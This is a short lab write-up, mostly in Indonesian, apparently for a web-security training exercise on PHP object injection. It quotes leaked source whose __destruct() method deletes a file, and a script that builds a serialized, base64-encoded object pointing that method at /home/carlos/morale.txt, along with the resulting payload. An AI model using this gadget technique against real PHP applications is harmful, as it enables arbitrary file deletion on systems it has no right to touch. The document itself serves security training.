# Lab: Arbitrary object injection in PHP

Challenge Description
 This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: wiener:peter 

Goal
modify serialized objects berupa session user, dan memanfaatkan fitur leak dari file dimana terdapat magic method yang bisa dimanfaatkan untuk menghapus /home/carlos/morale.txt

Solver
login dengan crendential yang diberikan dengan melihat leak pada file /libs/CustomTemplate.php~ 

disini akan leak source codenya
```php
class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }
```
```php
function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
```
dan pada bagian inilah terdapat rentannya
saya bisa memanfaatkan magic method __destruct()
untuk membantu menghapus /home/carlos/morale.txt
via variabel yang terdaftar di __construct() dan __destruct()
yaitu `private $lock_file_path;`
selanjutnya gunakan script ini untuk mengeneratenya
```php
<?php
class CustomTemplate {
    private $lock_file_path = "/home/carlos/morale.txt";
}

$payload = base64_encode(serialize(new CustomTemplate()));
echo $payload;
// Output: TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MzA6IgBDdXN0b21UZW1wbGF0ZQBsb2NrX2ZpbGVfcGF0aCI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=
?>
```
dengan ini /home/carlos/morale.txt akan terhapus
